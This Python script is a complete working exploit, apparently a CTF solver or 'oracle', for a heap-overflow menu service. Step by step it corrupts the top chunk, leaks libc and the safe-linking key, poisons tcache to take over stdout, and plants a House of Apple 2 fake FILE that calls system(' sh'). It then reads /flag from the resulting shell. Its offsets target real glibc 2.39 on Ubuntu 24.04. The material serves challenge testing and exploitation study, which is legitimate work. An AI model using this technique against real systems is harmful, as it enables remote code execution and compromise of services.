#!/usr/bin/env python3
"""PHASE 4 — deterministic offline oracle for House of Tangerine (House of Apple 2).

Implements the frozen PHASE 1 recipe against src/vuln.c (distinct, port 1337):

  1. menu protocol client matching vuln.c exactly: ops 1..4, raw byte-exact
     payload reads of size + 0x10 (no pwntools, stdlib socket only).
  2. top-chunk size overwritten through the fixed 16-byte linear overrun.
     chunk0 is reserved with request 0x20 (chunk 0x30): its window
     [U+0x20, U+0x30) is exactly top->prev_size + top->size, so the overrun
     reaches the top header and (after the trim) leaves the freed chunk's
     fd/bk untouched at the window's end.
  3. large reserve -> sysmalloc trims the corrupted top; the old top is
     _int_free'd into the unsorted bin (size 0xd20). Repeating the trick with
     corrupted size 0x2c1 frees 0x2a0 chunks straight into tcache.
  4. view(0) reads the unsorted chunk fd = main_arena + 0x60 -> libc base
     (mmap-region nibble asserted, base page-aligned).
  5. safe-linking: the third tcache chunk's encrypted next is leaked with
     view() of the shifted chunk in front of it, decrypted with the fixpoint
     loop, low 12 bits repaired from the known chunk-position constant, then
     key = enc ^ dec. Asserts: recovered heap page-aligned, key re-encrypts,
     decrypted chain == known chunk address.
  6. tcache poisoning: write stdout ^ key over the middle chunk's next field
     through the tight 16-byte window; pop the head twice, third malloc
     returns _IO_2_1_stdout_ as a chunk and the payload lands on stdout.
  7. House of Apple 2: fake wide FILE over stdout, wide_vtable->__overflow and
     ->__doallocate both = system, command bytes " sh" in _flags. The very
     next puts() (and exit() via _IO_flush_all) fires system().
  8. shell: `echo <nonce>` (liveness assert) and `cat /flag`; the flag is
     printed and asserted.

Everything is asserted; no brute force, no retries. Offsets are the shipped
glibc 2.39 (Ubuntu 24.04, libc6 2.39-0ubuntu8.x) and each one is validated
against the runtime shape (page alignment, safe-link re-encryption, chain
reconstruction). The Ubuntu build keeps sysmalloc's page-alignment assertion
armed, so every corrupted top size keeps old_end on a page boundary (the
0x...d40 top placement and 0x2c1 corruption below encode that).
Env overrides: HT_HOST, HT_PORT, FLAG_PATH.
"""

import os
import re
import socket
import struct
import sys
import time

HOST = os.environ.get("HT_HOST", "distinct")
PORT = int(os.environ.get("HT_PORT", "1337"))
FLAG_PATH = os.environ.get("FLAG_PATH", "/flag")

# glibc 2.39 (Ubuntu 24.04) — confirmed against libc6 2.39-0ubuntu8.9; the
# remote run must confirm these four (assertions below fail loudly otherwise).
LIBC_MAIN_ARENA = 0x204AC0
LIBC_STDOUT = 0x2055C0
LIBC_WFILE_JUMPS = 0x203228
LIBC_SYSTEM = 0x58750

# Deterministic heap offsets produced by the size schedule below (sysmalloc
# brk growth arithmetic of glibc 2.39). Validated at runtime: the page-aligned
# heap base and the re-encrypted safe-link key must match these.
OFF_TC2_USER = 0x43D50  # middle tcache chunk user data (leak target)
OFF_TC3_USER = 0x65D50  # head tcache chunk user data (leak position)
OFF_TC1_USER = 0x22D50  # oldest tcache chunk (not touched)

R_LEAK_TRIGGER = 0xD30  # chunk 0xd40 > corrupted top 0xd40 -> sysmalloc, frees 0xd20
R_DRAIN = 0xD00          # drains the 0xd20 unsorted chunk (exhaust fit)
R_PAD = 0xD18            # moves the top to 0x...a60 so the trim below lands at 0x...d40
R_A_SHIFT = 0x2D0        # chunk 0x2e0, window covers top prev_size+size
R_A_TIGHT = 0x2D8        # chunk 0x2e0, window covers tcache size+next
R_TRIG = 0xA58           # chunk 0xa60: > corrupted top 0x2c0 -> frees 0x2a0 to tcache
R_POP = 0x298            # chunk 0x2a0 -> pops the 0x2a0 tcache bin
CORRUPT_LEAK_TOP = 0xD41   # top end stays page-aligned: (0x2c0 + 0xd40) % 0x1000 == 0
CORRUPT_TCACHE_TOP = 0x2C1  # top end stays page-aligned: (0xd40 + 0x2c0) % 0x1000 == 0
# live top sizes written back by the reserves whose 16-byte window lands on a
# freshly created top header (layout arithmetic of the sysmalloc calls below)
TOP_AFTER_LEAK = 0x212C1   # (0x22000 - 0xd40) | PREV_INUSE
TOP_AFTER_PAD = 0x205A1    # (0x212c0 - 0xd20) | PREV_INUSE
TOP_AFTER_TRIG = 0x215A1   # (0x22000 - 0xa60) | PREV_INUSE

MENU_TIMEOUT = 10.0
SHELL_TIMEOUT = 20.0


def p64(value):
    return struct.pack("<Q", value)


def request2size(req):
    return max(0x20, (req + 8 + 0xF) & ~0xF)


def stage(name, ok, detail):
    print(f"[stage] {name}: {'ok' if ok else 'FAIL'} — {detail}")
    if not ok:
        raise AssertionError(f"{name}: {detail}")


def safe_link_decrypt(enc):
    """Invert PROTECT_PTR for a 6-byte leak: fixpoint peel of the key bits."""
    dec = enc
    for shift in (52, 40, 28, 16, 4):
        dec ^= (dec & (0xFFF << shift)) >> 12
    return dec


class Vault:
    """Menu protocol client byte-matching src/vuln.c."""

    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port), timeout=15)
        self.sock.settimeout(MENU_TIMEOUT)
        self.buf = b""
        self.sizes = {}
        self.banner = self.recv_until(b"> ")

    def send(self, data):
        self.sock.sendall(data)

    def recv_until(self, token):
        while token not in self.buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError(f"connection closed while waiting for {token!r}")
            self.buf += chunk
        end = self.buf.index(token) + len(token)
        out, self.buf = self.buf[:end], self.buf[end:]
        return out

    def _menu_slot(self, op, slot):
        self.send(f"{op}\n".encode())
        self.recv_until(b"slot> ")
        self.send(f"{slot}\n".encode())

    def _menu_reserve(self, slot, size):
        self.send(b"1\n")
        self.recv_until(b"slot size> ")
        self.send(f"{slot} {size}\n".encode())
        self.recv_until(b"data> ")

    def reserve(self, slot, size, data):
        assert len(data) == size + 0x10, "payload must be exactly size + 0x10"
        self._menu_reserve(slot, size)
        self.send(data)
        self.recv_until(b"stored\n")
        self.sizes[slot] = size

    def reserve_trigger(self, slot, size, data):
        """Final reserve: its trailing puts() is the House of Apple 2 trigger."""
        assert len(data) == size + 0x10, "payload must be exactly size + 0x10"
        self._menu_reserve(slot, size)
        self.send(data)

    def rewrite(self, slot, data):
        size = self.sizes[slot]
        assert len(data) == size + 0x10, "payload must be exactly slot size + 0x10"
        self._menu_slot(3, slot)
        self.recv_until(b"data> ")
        self.send(data)
        self.recv_until(b"edited\n")

    def view(self, slot):
        self._menu_slot(2, slot)
        out = self.recv_until(b"shown\n")
        assert out.endswith(b"\nshown\n"), "view framing mismatch"
        return out[: -len(b"\nshown\n")]

    def leave(self):
        self.send(b"4\n")

    def shell_read(self, deadline, done):
        self.sock.settimeout(0.5)
        out = self.buf
        self.buf = b""
        while time.time() < deadline:
            if done(out):
                break
            try:
                chunk = self.sock.recv(4096)
            except TimeoutError:
                continue
            if not chunk:
                break
            out += chunk
        return out


def parse_pointer(raw6):
    return struct.unpack("<Q", raw6.ljust(8, b"\x00"))[0]


def build_apple2(libc):
    """House of Apple 2 fake FILE sized for the 0x2a8-byte poisoned write."""
    stdout_addr = libc + LIBC_STDOUT
    lock = stdout_addr + 0x260
    wide = stdout_addr + 0xE0
    vtable = stdout_addr + 0x1D0
    system = libc + LIBC_SYSTEM
    fake = bytearray(0x2A8)

    def put(off, value):
        fake[off:off + 8] = p64(value)

    fake[0:8] = b" sh\x00\x00\x00\x00\x00"  # _flags: no NO_WRITES/UNBUFFERED, rdi -> " sh"
    put(0x20, 0)                            # _IO_write_base = 0
    put(0x28, 1)                            # _IO_write_ptr = 1 > write_base (flush gate)
    put(0x68, 0)                            # _chain = NULL (end of _IO_list_all walk)
    put(0x88, lock)                         # _lock -> zeroed qword inside payload
    put(0xA0, wide)                         # _wide_data
    put(0xC0, 0)                            # _mode = 0 (byte stream, flush gate ok)
    put(0xD8, libc + LIBC_WFILE_JUMPS)      # real vtable: passes IO_validate_vtable

    put(0xE0 + 0xE0, vtable)                # wide_data->_wide_vtable -> fake jump table
    put(0x1D0 + 0x18, system)               # __overflow   -> system (puts path)
    put(0x1D0 + 0x68, system)               # __doallocate -> system (exit flush path)
    return bytes(fake)


def main():
    # static stage preconditions (frozen sizes)
    stage("sizes", request2size(0x20) == 0x30 and request2size(R_A_SHIFT) == 0x2E0
          and request2size(R_A_TIGHT) == 0x2E0 and request2size(R_TRIG) == 0xA60
          and request2size(R_POP) == 0x2A0 and request2size(R_LEAK_TRIGGER) == 0xD40
          and request2size(R_PAD) == 0xD20 and request2size(R_DRAIN) == 0xD10,
          "request2size schedule 0x30/0x2e0/0xa60/0x2a0/0xd40/0xd20/0xd10")

    vault = Vault(HOST, PORT)
    stage("protocol", b"distinct 1.0" in vault.banner and b"1) reserve" in vault.banner,
          f"banner received from {HOST}:{PORT}")

    # ---- 2. corrupt top via the 0x20-request window: top prev_size+size -----
    stage("top-corrupt/unsorted", request2size(R_LEAK_TRIGGER) + 0x20 > CORRUPT_LEAK_TOP,
          f"chunk {request2size(R_LEAK_TRIGGER):#x} + MINSIZE > "
          f"corrupted top {CORRUPT_LEAK_TOP:#x}")
    vault.reserve(0, 0x20, b"A" * 0x20 + p64(0x4141414141414141) + p64(CORRUPT_LEAK_TOP))

    # ---- 3. sysmalloc trims the top; old top -> unsorted bin ---------------
    # the same 16-byte window now lands on the freshly created top; keep its
    # live size valid (0x212c0 | PREV_INUSE) so later allocations see it.
    vault.reserve(1, R_LEAK_TRIGGER,
                  b"B" * R_LEAK_TRIGGER + p64(0x4141414141414141) + p64(TOP_AFTER_LEAK))

    # ---- 4. leak the unsorted fd = main_arena + 0x60 -----------------------
    vault.rewrite(0, b"A" * 0x20 + p64(0x4242424242424242) + p64(0x4343434343434343))
    leak_data = vault.view(0)
    stage("leak/fd-offset", len(leak_data) == 0x36,
          f"view(0) returned {len(leak_data):#x} bytes (fd at 0x30)")
    fd = parse_pointer(leak_data[0x30:0x36])
    main_arena = fd - 0x60
    libc = main_arena - LIBC_MAIN_ARENA
    # mmap-region nibble (top byte varies with host ASLR spread: 0x7f on
    # 4-level paging hosts, 0x7e observed on wider-spread hosts) + page base.
    stage("leak/libc", (fd >> 44) == 0x7 and libc % 0x1000 == 0,
          f"fd={fd:#x} main_arena={main_arena:#x} libc={libc:#x}")
    stdout_addr = libc + LIBC_STDOUT

    # ---- 4b. restore the freed chunk header and drain it back to a known ----
    # heap shape (allocate it out of the unsorted/large bin).
    vault.rewrite(0, b"A" * 0x20 + p64(0x4242424242424242) + p64(0xD21))
    vault.reserve(2, R_DRAIN, b"D" * (R_DRAIN + 0x10))
    stage("drain/unsorted", request2size(R_DRAIN) <= 0xD20 and 0xD20 - request2size(R_DRAIN) < 0x20,
          f"drain chunk {request2size(R_DRAIN):#x} exhausts the freed 0xd20 chunk")

    # ---- 4c. padding so each trim starts with the top end page-aligned ------
    vault.reserve(3, R_PAD,
                  b"E" * R_PAD + p64(TOP_AFTER_PAD) + p64(0x4646464646464646))
    stage("pad/top-align", (0xA60 + request2size(R_A_SHIFT)) % 0x1000 == 0xD40,
          "padding chunk 0xd20 puts the top at 0x...a60; trim end at 0x...d40")

    # ---- staging: three 0x2a0 tcache chunks from three corrupted tops ------
    # order: TC1 (oldest), TC2 (middle, leak target), TC3 (head)
    for a_slot, r_a in ((4, R_A_SHIFT), (6, R_A_TIGHT), (8, R_A_SHIFT)):
        if r_a == R_A_SHIFT:  # window = top prev_size + size
            corrupt = b"A" * R_A_SHIFT + p64(0x4141414141414141) + p64(CORRUPT_TCACHE_TOP)
        else:                 # window = top size + top user area
            corrupt = b"A" * R_A_TIGHT + p64(CORRUPT_TCACHE_TOP) + p64(0x4141414141414141)
        vault.reserve(a_slot, r_a, corrupt)
        stage(f"top-corrupt/tcache-{a_slot}",
              request2size(R_TRIG) + 0x20 > CORRUPT_TCACHE_TOP,
              f"trigger chunk {request2size(R_TRIG):#x} > corrupted top {CORRUPT_TCACHE_TOP:#x}")
        # the trigger reserve's window lands on the new top header: keep it valid
        vault.reserve(a_slot + 1, R_TRIG,
                      b"C" * R_TRIG + p64(TOP_AFTER_TRIG) + p64(0x4343434343434343))

    # ---- 5. safe-linking key recovery --------------------------------------
    # patch the head chunk's header non-NUL (window stops exactly at its user
    # data), then view it and read the encryped next pointer of the middle one.
    vault.rewrite(8, b"D" * R_A_SHIFT + p64(0x4545454545454545) + p64(0x4646464646464646))
    leaked = vault.view(8)
    stage("leak/safelink-window", len(leaked) == R_A_SHIFT + 0x10 + 6,
          f"view(8) returned {len(leaked):#x} bytes = 0x2e0 header + 6 leaked")
    enc = parse_pointer(leaked[R_A_SHIFT + 0x10:R_A_SHIFT + 0x10 + 6])
    dec = safe_link_decrypt(enc)
    dec = (dec & ~0xFFF) | (OFF_TC2_USER & 0xFFF)
    heap = dec - OFF_TC2_USER
    page = heap % 0x1000 == 0
    key = enc ^ dec
    layout_ok = key == (heap + OFF_TC3_USER) >> 12
    reenc_ok = (key ^ dec) == enc
    stage("safelink/key", page and layout_ok and reenc_ok,
          f"enc={enc:#x} dec={dec:#x} heap={heap:#x} key={key:#x} "
          f"expected={(heap + OFF_TC3_USER) >> 12:#x}")

    # ---- 6. tcache poisoning: middle chunk's next -> stdout ----------------
    key2 = (heap + OFF_TC2_USER) >> 12
    poison = stdout_addr ^ key2
    vault.rewrite(6, b"E" * R_A_TIGHT + p64(0x4747474747474747) + p64(poison))
    stage("poison/target",
          (poison ^ key2) == stdout_addr and stdout_addr % 0x10 == 0,
          f"next={poison:#x} decrypts to malloc-aligned stdout={stdout_addr:#x}")

    # pop head (TC3), middle (TC2), then malloc returns stdout as a chunk
    vault.reserve(10, R_POP, b"P" * (R_POP + 0x10))
    vault.reserve(11, R_POP, b"Q" * (R_POP + 0x10))

    # ---- 7. House of Apple 2 payload written over stdout -------------------
    vault.reserve_trigger(12, R_POP, build_apple2(libc))

    # ---- 8. shell: nonce liveness + /flag ----------------------------------
    nonce = b"HT-%08x" % (os.getpid() & 0xFFFFFFFF)
    vault.send(b"echo " + nonce + b"\ncat " + FLAG_PATH.encode() + b"\n")
    flag_re = re.compile(rb"flag\{[0-9a-f]{32}\}")
    deadline = time.time() + SHELL_TIMEOUT
    out = vault.shell_read(deadline, lambda data: flag_re.search(data) is not None)
    stage("alloc/stdout", nonce in out and b"stored" not in out,
          f"3rd malloc was stdout: no 'stored' banner, system() echoed {nonce.decode()}")
    match = flag_re.search(out)
    stage("shell/flag", match is not None,
          "cat /flag returned flag{32 hex}" if match else f"no flag in {out[:200]!r}")
    print(match.group(0).decode())
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as exc:  # noqa: BLE001 - oracle fails loudly
        print(f"[oracle] FAILED: {exc}", file=sys.stderr)
        sys.exit(1)
